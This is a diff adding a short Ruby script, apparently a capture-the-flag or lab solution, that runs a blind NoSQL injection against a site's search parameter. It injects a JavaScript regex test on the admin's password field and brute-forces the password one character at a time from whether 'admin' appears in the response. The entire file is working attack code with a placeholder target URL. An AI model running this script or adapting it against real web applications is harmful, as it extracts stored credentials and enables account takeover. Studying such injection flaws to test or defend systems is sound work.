@@ -1,0 +1,27 @@
+#http://[url]/?search=admin%27%20%26%26%20this.password.match(/^f/)%00
+
+require 'httparty'
+
+URL="[url]" #change this
+def check?(str)
+  resp = HTTParty.get("http://#{URL}/?search=admin%27%20%26%26%20this.password.match(/#{str}/)%00")
+  return resp.body =~ />admin</
+end
+
+#puts check?("d").inspect
+#puts check?("aaa").inspect
+
+CHARSET = ('a'..'z').to_a+('0'..'9').to_a+['-']
+password = ""
+
+while true
+   CHARSET.each do |c|
+      puts "Trying: #{c} for #{password}"
+      test = password+c
+      if check?("^#{test}.*$")
+        password+=c
+        puts password
+        break
+      end
+   end
+end
